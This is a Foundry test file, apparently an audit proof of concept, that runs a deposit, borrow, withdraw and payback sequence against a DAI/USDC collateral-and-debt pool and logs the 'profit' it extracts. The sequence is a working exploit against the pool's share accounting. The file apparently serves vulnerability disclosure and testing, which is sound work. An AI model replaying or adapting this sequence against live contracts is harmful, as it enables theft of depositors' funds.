// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import {PoolT1BaseTest} from "./pool.t.sol";

import "forge-std/Test.sol";
import "forge-std/console2.sol";

contract PoolT1PoC is PoolT1BaseTest {
    function setUp() public override {
        super.setUp();
    }
    
    function test_POCArbitrageAttack() public {
        _makeUserContract(alice, true);

        uint256 depositedShares_ = 2* 1e4 * 1e18;
        uint256 borrowAmount0_ = 1 * DAI_USDC.token0Wei;
        uint256 borrowAmount1_ = 1e4 * DAI_USDC.token1Wei;

        vm.prank(address(alice));
        (uint256 depositAmount0_, uint256 depositAmount1_) = DAI_USDC.dexColDebt.depositPerfect(
            depositedShares_,
            type(uint256).max,
            type(uint256).max,
            false
        );

        console.log("depositAmount0_", depositAmount0_);
        console.log("depositAmount1_", depositAmount1_);

        vm.prank(address(alice));
        (uint256 borrowShares_) = DAI_USDC.dexColDebt.borrow(
            borrowAmount0_,
            borrowAmount1_,
            type(uint256).max,
            address(0)
        );

        console.log("borrowShares_", borrowShares_);

        vm.prank(address(alice));
        (uint256 withdrawAmount0_, uint256 withdrawAmount1_) = DAI_USDC.dexColDebt.withdrawPerfect(
            depositedShares_,
            0,
            0,
            address(0)
        );
        console.log("withdrawAmount0_", withdrawAmount0_);
        console.log("withdrawAmount1_", withdrawAmount1_);
        console.log("Withdraw profit", (withdrawAmount0_ / DAI_USDC.token0Wei) + (withdrawAmount1_ / DAI_USDC.token1Wei), (depositAmount1_ / DAI_USDC.token1Wei) + (depositAmount0_ / DAI_USDC.token0Wei));

        vm.prank(address(alice));
        (uint256 paybackAmount0_, uint256 paybackAmount1_) = DAI_USDC.dexColDebt.paybackPerfect(
            borrowShares_,
            type(uint).max,
            type(uint).max,
            false
        );

        console.log("paybackAmount0_", paybackAmount0_);
        console.log("paybackAmount1_", paybackAmount1_);
        console.log("Payback profit", (borrowAmount1_ / DAI_USDC.token1Wei) + (borrowAmount0_ / DAI_USDC.token0Wei), (paybackAmount0_ / DAI_USDC.token0Wei) + (paybackAmount1_ / DAI_USDC.token1Wei));
    }

    function test_POC() external {}
}